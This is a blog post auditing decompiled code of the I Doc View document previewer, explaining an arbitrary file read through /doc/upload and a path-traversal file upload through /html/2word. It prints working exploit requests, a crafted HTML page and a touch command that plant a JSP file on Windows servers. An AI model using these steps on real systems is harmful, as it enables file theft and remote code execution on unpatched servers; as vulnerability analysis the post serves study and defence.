title: I Doc View在线文档预览 代码审计
author: Bmth
tags: []
categories:
  - 代码审计
top_img: 'https://img-blog.csdnimg.cn/direct/a556db3b19924ac19777221ee79e9e04.jpeg'
cover: 'https://img-blog.csdnimg.cn/direct/a556db3b19924ac19777221ee79e9e04.jpeg'
date: 2023-12-15 15:50:00
---
![](https://img-blog.csdnimg.cn/direct/a556db3b19924ac19777221ee79e9e04.jpeg)

好久没有代码审计了，机缘巧合之下获取到了 I Doc View 的源码，那么就分析一下最近爆出来的漏洞吧

影响版本：
- I Doc View<13.10.1_20231115

这次分析的版本为： Version: 6.9.8_20160812

在线文档预览API接口：[https://www.idocv.com/docs.html](https://www.idocv.com/docs.html)

## 代码审计
### /doc/upload 任意文件读取
看到控制器：`classes/com/idocv/docview/controller/DocController.class`
![](https://img-blog.csdnimg.cn/direct/b5e88c750c35492d81d65cbd8ffa32ac.png)

可以看到这里需要存在参数token，如果查询结果为 null 则 throw 抛出异常
跟进到`classes/com/idocv/docview/dao/impl/AppDaoImpl.class`的 getByToken 方法
![](https://img-blog.csdnimg.cn/direct/859babbb83a640cc80735640f70c0fcb.png)

使用`QueryBuilder.start`查询token的值

其实这个值在默认安装的时候已经被设置了：[https://soft.idocv.com/idocv.zip](https://soft.idocv.com/idocv.zip)
![](https://img-blog.csdnimg.cn/direct/dd17e81ee1f04d4e9688c3be91db91e2.png)

应用token默认设置为 testtoken，接着往下看
![](https://img-blog.csdnimg.cn/direct/c246bcd74f2a4ce5aa98c370af218fad.png)

由于我们是GET传参，会执行到`this.docService.addUrl(req, app, uid, name, url, mode, label)`

跟进到`classes/com/idocv/docview/service/impl/DocServiceImpl.class`的 addUrl 方法
![](https://img-blog.csdnimg.cn/direct/5e05ebc85fc448df939deb484eab2a42.png)

这里`this.urlViewAllowDomains`需要设置为`*`
![](https://img-blog.csdnimg.cn/direct/c65cc6f4520641198ce3e1f672dfa700.png)

直接会执行到
```java
if (StringUtils.isNotBlank(url) && url.matches("file:/{2,3}(.*)")) {
    host = url.replaceFirst("file:/{2,3}(.*)", "$1");
    File srcFile = new File(host);
    if (!srcFile.isFile()) {
        logger.error("URL预览失败，未找到本地文件（" + host + "）");
        throw new DocServiceException("URL预览失败，未找到本地文件（" + host + "）");
    }
	
    if (StringUtils.isBlank(name)) {
        name = srcFile.getName();
    }
	
    data = FileUtils.readFileToByteArray(srcFile);
    ...
    if (ArrayUtils.isEmpty(data)) {
        throw new DocServiceException("未找到可用的网络或本地文档！");
    } else if ((long)data.length > this.uploadMaxSize) {
        logger.error(this.uploadMaxMsg);
        throw new DocServiceException(this.uploadMaxMsg);
    } else {
        vo = this.add(req, app, uid, name, data, mode, labelName);
```
即通过正则匹配获取到`file://`协议后的文件路径，然后使用`new File()`读取该文件储存为data，调用add方法
![](https://img-blog.csdnimg.cn/direct/5af5bc919d9a496c89c3355397493230.png)

跟进到addDoc方法
![](https://img-blog.csdnimg.cn/direct/d4814cf6698c40198b9242b497563ce2.png)

![](https://img-blog.csdnimg.cn/direct/c02486f24490402eb91d8630424e91db.png)

需要注意：
1. 通过传参 name 满足上传的后缀，否则直接 throw 抛出异常了
2. 如果没有传md5，那么`md5 = DigestUtils.md5Hex(data);`，注意这里 data 为文件内容，然后使用`convertPo2Vo(this.docDao.getByMd5(md5, false))`进行查询，如果存在该值，则直接 return 返回

最后会调用`FileUtils.writeByteArrayToFile(new File(this.rcUtil.getPath(rid)), data)`将读取到的文件内容写入到新的文件中

将文件路径保存到 srcUrl，并会 return result 返回结果
![](https://img-blog.csdnimg.cn/direct/92d2e5d0989b432d9ef1628609e8b248.png)

#### 漏洞利用
由于是windows环境下，我们尝试读取`c:/windows/win.ini`
```
/doc/upload?token=testtoken&url=file:///c:/windows/win.ini&name=1.txt&md5=1111
```
![](https://img-blog.csdnimg.cn/direct/60abeaf89726490db103689ff82b804b.png)

访问该文件
![](https://img-blog.csdnimg.cn/direct/562c196d57784a5b8cf2ef64bdf4ebeb.png)

### /html/2word 任意文件上传漏洞 
看到控制器：`classes/com/idocv/docview/controller/HtmlController.class`
![](https://img-blog.csdnimg.cn/direct/420c255dad0a4a07ad3831a9737b4401.png)

这里会判断 md5Url 文件目录下的 index.html 是否存在，如果不存在则调用`GrabWebPageUtil.downloadHtml(url, htmlDir)`进行下载

跟进到`classes/com/idocv/docview/util/GrabWebPageUtil.class`的 downloadHtml 方法
![](https://img-blog.csdnimg.cn/direct/df5424fc28914bf193f8283ce2402755.png)

这里的obj对象可控，跟进到`getWebPage(obj, outputDir, "index.html")`
![](https://img-blog.csdnimg.cn/direct/be3bae3ec9034066823516bfd79cb1c6.png)

这里filename为定值index.html，`new File(outputDir, filename)`创建File对象，`obj.openConnection()`对传入的URL建立连接，接着往下看
![](https://img-blog.csdnimg.cn/direct/2cd819b8bb034466917cfaf82cbe2aad.png)

获取到 URLConnection 响应的内容，并调用`GrabUtility.searchForNewFilesToGrab(htmlContent, obj)`处理，最后将结果写入到 outputFile 文件内

看到`classes/com/idocv/docview/util/GrabUtility.class`的 searchForNewFilesToGrab 方法
```java
public static String searchForNewFilesToGrab(String htmlContent, URL fromHTMLPageUrl) {
    Document responseHTMLDoc = null;
    String urlToGrab = null;
    if (!htmlContent.trim().equals("")) {
        responseHTMLDoc = Jsoup.parse(htmlContent);
        System.out.println("All Links - ");
        Elements links = responseHTMLDoc.select("link[href]");
        Iterator var5 = links.iterator();

        while(var5.hasNext()) {
            Element link = (Element)var5.next();
            urlToGrab = link.attr("href");
            addLinkToFrontier(urlToGrab, fromHTMLPageUrl);
            System.out.println("Actual URL - " + urlToGrab);
            String replacedURL = urlToGrab.substring(urlToGrab.lastIndexOf("/") + 1);
            htmlContent = htmlContent.replaceAll(urlToGrab, replacedURL);
            System.out.println("Replaced URL - " + replacedURL);
        }

        System.out.println("All external scripts - ");
        Elements links2 = responseHTMLDoc.select("script[src]");
        Iterator var11 = links2.iterator();

        while(var11.hasNext()) {
            Element link = (Element)var11.next();
            urlToGrab = link.attr("src");
            addLinkToFrontier(urlToGrab, fromHTMLPageUrl);
            System.out.println("Actual URL - " + urlToGrab);
            String replacedURL = urlToGrab.substring(urlToGrab.lastIndexOf("/") + 1);
            htmlContent = htmlContent.replaceAll(urlToGrab, replacedURL);
            System.out.println("Replaced URL - " + replacedURL);
        }

        System.out.println("All images - ");
        Elements links3 = responseHTMLDoc.select("img[src]");
        Iterator var14 = links3.iterator();

        while(var14.hasNext()) {
            Element link = (Element)var14.next();
            urlToGrab = link.attr("src");
            addLinkToFrontier(urlToGrab, fromHTMLPageUrl);
            System.out.println("Actual URL - " + urlToGrab);
            String replacedURL = urlToGrab.substring(urlToGrab.lastIndexOf("/") + 1);
            htmlContent = htmlContent.replaceAll(urlToGrab, replacedURL);
            System.out.println("Replaced URL - " + replacedURL);
        }
    }

    return htmlContent;
}
```
简单来说就是获取`link[href]`、`script[src]`、`img[src]`三个标签内对应的值，然后通过addLinkToFrontier方法添加到filesToGrab变量中

回头看到 downloadHtml 方法
![](https://img-blog.csdnimg.cn/direct/b2b13b4513c6445cae01c4613705c0ef.png)

发现会从 GrabUtility.filesToGrab 中获取值，并再次调用`getWebPage(obj, outputDir)`
![](https://img-blog.csdnimg.cn/direct/8a3695aebdd540caad8786c0af692374.png)

而这里我们的filename就是可控的，但是由于是通过`/`进行截取，所以只能在windows条件下，通过`..\..\..\..\`构造目录穿越

最后最巧的就是竟然没有匹配`jsp`后缀
```java
if (!filename.endsWith("html") && !filename.endsWith("htm") && !filename.endsWith("asp") && !filename.endsWith("aspx") && !filename.endsWith("php") && !filename.endsWith("php") && !filename.endsWith("net")) {
```
![](https://img-blog.csdnimg.cn/direct/0440ba8b0cc3466597bbcfdc107e30d5.png)

即成功写入outputFile对象，内容为`conn.getInputStream()`

#### 漏洞利用
test.html：
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>test</title>  
</head>
<body>
  <link href="/..\..\..\docview\poc.jsp">
</body>
</html>
```
然后通过 touch 命令构造
```bash
touch '..\..\..\docview\poc.jsp'
```
最后`/html/2word?url=http://ip:port/test.html`
![](https://img-blog.csdnimg.cn/direct/7b0d0c3b564a402ba575067b031af764.png)

参考：
[【漏洞复现】I Doc View任意文件上传漏洞](https://mp.weixin.qq.com/s/lDqhDnZGXoRyp2IolQ2odg)
[IDocView 前台RCE漏洞分析](https://xz.aliyun.com/t/13096)

## 总结
这个系统可以说是非常简单进行代码审计的一类，因为代码量相对很少，并且就使用了 Spring MVC 中的 Interceptor 和 controller，逻辑比较简单

这次漏洞也很巧合的是windows可以使用`..\`进行目录穿越，从而绕过限制
